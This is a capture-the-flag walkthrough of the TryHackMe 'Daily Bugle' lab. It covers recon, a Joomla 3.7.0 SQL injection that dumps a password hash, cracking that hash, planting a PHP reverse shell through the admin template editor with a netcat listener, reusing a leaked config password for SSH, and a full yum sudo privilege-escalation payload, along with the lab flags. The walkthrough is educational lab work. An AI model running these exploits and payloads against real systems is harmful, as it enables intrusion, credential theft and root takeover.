# Daily Bugle

## Task 1 - Deploy
1. Access the web server, who robbed the bank?
```
Spiderman
```

## Task 2 - Obtain User and Root
Recon:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ nmap -sC -sV -Pn -n $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 19:51 MDT
Nmap scan report for 10.10.27.26
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.57 seconds
```
```bash
jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.27.26
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/17 19:54:11 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2020/05/17 19:55:20 Finished
===============================================================
```

Robots.txt:
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

1. What is the Joomla version?

  First starting out down the path of researching where version information might be stored in a Joomla server and in what files. Common placeholders are in `/templates/system/css/system.css`. When navigating to `/templates/system/css/` we get the following directory listing:

  ![system](https://user-images.githubusercontent.com/32188816/82169164-d5970680-987d-11ea-92dc-aa064a992b9c.png)

  Analyzing all of the files in this directory did not yeild a Joomla version. So, back to running gobuster on the various endpoints found from our intial scans. In the `/language/` directory, we find another directory `/en-GB/`:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ gobuster dir -u http://$IP/language -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.27.26/language
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Timeout:        10s
  ===============================================================
  2020/05/17 20:27:06 Starting gobuster
  ===============================================================
  /en-GB (Status: 301)
  ```
  Opening up the `/language/en-GB/` directory in our browser yeilds a lot of files:

  ![files](https://user-images.githubusercontent.com/32188816/82169540-01ff5280-987f-11ea-876c-0d59b5523979.png)

  At the bottom of the page we find a  `en-GB.xml` file, which contains the Joomla version:
  ![version](https://user-images.githubusercontent.com/32188816/82169618-3bd05900-987f-11ea-8878-9c1a7343dd70.png)


2. **Instead of using SQLMap, why not use a python script!**

    What is Jonah's cracked password?

  So the challenge recommends using a python script, but I first started with some basic sqlmap, but to no avail. After doing some research, [this script](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) is a working PoC Joomla 3.7.0 SQLi exploit. After downloading the script locally and running it, we are able to obtain the password hash of Jonah:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ python joomla.py http://$IP

    .---.    .-'''-.        .-'''-.
    |   |   '   _    \     '   _    \                            .---.
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''.     |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
|____.'                                                                `--'  `" '---'   '---'

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
  ```
Now that we have the hash, we can use JtR to crack the hash. Here we are going to use the `rockyou.txt` wordlist:
``` bash
jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ /opt/JohnTheRipper/run/john jonah_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:59 0.11% (ETA: 2020-05-20 07:47) 0g/s 81.71p/s 81.71c/s 81.71C/s 150588..shalini
0g 0:00:07:01 0.19% (ETA: 2020-05-20 09:54) 0g/s 79.16p/s 79.16c/s 79.16C/s coco21..atlas
spiderman123     (?)
1g 0:00:09:49 DONE (2020-05-17 21:33) 0.001696g/s 79.53p/s 79.53c/s 79.53C/s thelma1..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

3. What is the user flag?

  Now that we have credentials, we can log into the `/administrator` enpoint of the site as the `jonah` user. Once we log in, we see that we can view and modify some of the website's templates:

  ![templates](https://user-images.githubusercontent.com/32188816/82178969-785d7e00-989a-11ea-9893-12a7a594a8ff.png)

  Once we are in the templates page, there are two templates we can select from, which will lead to different URL paths later on:

  ![beez3](https://user-images.githubusercontent.com/32188816/82179052-a8a51c80-989a-11ea-93e1-83074d8eaef2.png)

  Selecting the Beez3 template, we see a slew of files that we can add, remove, or update. Here is where I selected to add a new file by clicking on "New File", naming the file `revshell` and selecting the PHP file type. Once the file is created we can drop the code for a PHP reverse shell:

  ![file](https://user-images.githubusercontent.com/32188816/82179219-06396900-989b-11ea-834e-b468510aeb94.png)

  In the terminal set up a listener on the port specified in the PHP reverse shell:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ nc -lvp 9999
  ```

  Now, we just need to navigate to the URL that will execute the reverse shell:
  ```
  http://$IP/templates/beez3/revshell.php
  ```

  Back in the terminal, we have caught the shell:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ nc -lvp 9999
  listening on [any] 9999 ...
  10.10.27.26: inverse host lookup failed: Unknown host
  connect to [10.8.21.42] from (UNKNOWN) [10.10.27.26] 45672
  Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
   02:06:26 up  4:18,  1 user,  load average: 0.00, 0.06, 0.13
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  jjameson pts/3    ip-10-8-21-42.eu 01:57    6:58   0.00s  0.00s -bash
  uid=48(apache) gid=48(apache) groups=48(apache)
  sh: no job control in this shell
  sh-4.2$ id
  id
  uid=48(apache) gid=48(apache) groups=48(apache)
  sh-4.2$ ls /home
  ls /home
  jjameson
  sh-4.2$
  ```

  So we have one user `jjameson` in the home directory....

  From here you know the drill, load up `linpeas.sh` and execute. Running linpeas found a couple of potentially vulnerable items associated with the server:
  ```
  /var/www/html/libraries/joomla/http/transport/cacert.pem
  /var/www/html/bin
  /var/www/html/bin/index.html
  /var/www/html/bin/keychain.php
  ```

  But linpeas also found what looks to be a hard coded password:
  ```bash
  [+] Searching passwords in config PHP files
  	public $password = 'nv5uz9r3ZEDzVjNu';
  ```

  SSH to the box using `jjameson:nv5uz9r3ZEDzVjNu` got us in, and in the home directory is our flag:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Daily Bugle$ ssh jjameson@$IP
  jjameson@10.10.27.26's password:
  Last failed login: Mon May 18 01:46:55 EDT 2020 on pts/1
  There was 1 failed login attempt since the last successful login.
  Last login: Mon Dec 16 05:14:55 2019 from netwars
  [jjameson@dailybugle ~]$ ls
  user.txt
  [jjameson@dailybugle ~]$ cat user.txt
  27a260fe3cba712cfdedb1c86d80442e
  [jjameson@dailybugle ~]$
  ```


4. What is the root flag?

  Starting with some low-hanging fruit, we see that `jjameson` can run yum as sudo with NOPASSWD, interesting.
  ```bash
  [jjameson@dailybugle ~]$ sudo -l
  Matching Defaults entries for jjameson on dailybugle:
      !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
      USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
      env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

  User jjameson may run the following commands on dailybugle:
      (ALL) NOPASSWD: /usr/bin/yum
  ```

  So, courtesy of [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), we can use the following payload to escalate our priveleges leveraging that we can execute `yum` as root:
  ```bash
  TF=$(mktemp -d)
  cat >$TF/x<<EOF
  [main]
  plugins=1
  pluginpath=$TF
  pluginconfpath=$TF
  EOF

  cat >$TF/y.conf<<EOF
  [main]
  enabled=1
  EOF

  cat >$TF/y.py<<EOF
  import os
  import yum
  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
  requires_api_version='2.1'
  def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
  EOF

  sudo yum -c $TF/x --enableplugin=y
  ```

  After dropping that into the shell, we are now root:
  ```bash
  [jjameson@dailybugle ~]$ TF=$(mktemp -d)
  [jjameson@dailybugle ~]$ cat >$TF/x<<EOF
  > [main]
  > plugins=1
  > pluginpath=$TF
  > pluginconfpath=$TF
  > EOF
  [jjameson@dailybugle ~]$
  [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
  > [main]
  > enabled=1
  > EOF
  [jjameson@dailybugle ~]$
  [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
  > import os
  > import yum
  > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
  > requires_api_version='2.1'
  > def init_hook(conduit):
  >   os.execl('/bin/sh','/bin/sh')
  > EOF
  [jjameson@dailybugle ~]$
  [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
  Loaded plugins: y
  No plugin match for: y
  sh-4.2# id
  uid=0(root) gid=0(root) groups=0(root)
  sh-4.2# ls
  user.txt
  sh-4.2# cd /root
  sh-4.2# cat root.txt
  eec3d53292b1821868266858d7fa6f79
  sh-4.2#
  ```

## Task 3 - Credits
1. Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located [here](https://tryhackme.com/thread/5e1ef29a2eda9b0f20b151fd).
